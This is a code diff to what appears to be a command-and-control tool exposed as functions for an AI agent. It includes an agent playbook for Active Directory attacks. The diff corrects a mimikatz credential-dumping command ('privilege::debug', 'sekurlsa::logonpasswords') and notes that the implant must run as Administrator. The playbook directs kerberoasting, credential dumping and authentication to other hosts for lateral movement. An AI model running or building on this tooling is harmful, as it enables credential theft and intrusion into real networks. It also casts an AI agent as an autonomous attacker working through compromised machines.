@@ -372,7 +372,7 @@ def c2_run_kerberoast(agent_id: str) -> str:
 def c2_run_secretsdump(agent_id: str, tool_and_args: str) -> str:
     """
     Run a credential-dumping tool on the agent.
-    tool_and_args example: 'mimikatz.exe sekurlsa::logonpasswords exit'
+    tool_and_args example: 'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit'
     The tool binary must exist in server/files/. Blocks up to 2 minutes.
     """
     if not tool_and_args.strip():
@@ -619,8 +619,8 @@ PHASE 2 — AD ENUMERATION + ANALYSIS + VISUALIZATION
 PHASE 3 — CREDENTIAL HARVESTING
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 6. c2_run_kerberoast(agent_id)          → TGS hashes for kerberoastable accounts
-7. c2_run_secretsdump(agent_id, "mimikatz.exe sekurlsa::logonpasswords exit")
-   → only if mimikatz.exe is in server/files/
+7. c2_run_secretsdump(agent_id, 'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit')
+   → only if mimikatz.exe is in server/files/; implant must be running as Administrator
 8. c2_get_credentials()                 → list ALL credentials now in the DB
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -635,7 +635,7 @@ Execute BOTH paths A and B whenever matches are found:
     2. If YES:
        a. c2_authenticate(agent_id, username, password, target_ip, service)
           → verifies the credentials work on the target
-       b. If access confirmed → c2_run_secretsdump(agent_id, "mimikatz.exe ...")
+       b. If access confirmed → c2_run_secretsdump(agent_id, 'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit')
           → dumps credentials from the target machine
        c. c2_get_credentials() → update your view of available creds
     Example: analysis says "jsmith → LOCAL ADMIN → CORPSRV01" and you have jsmith:Password1
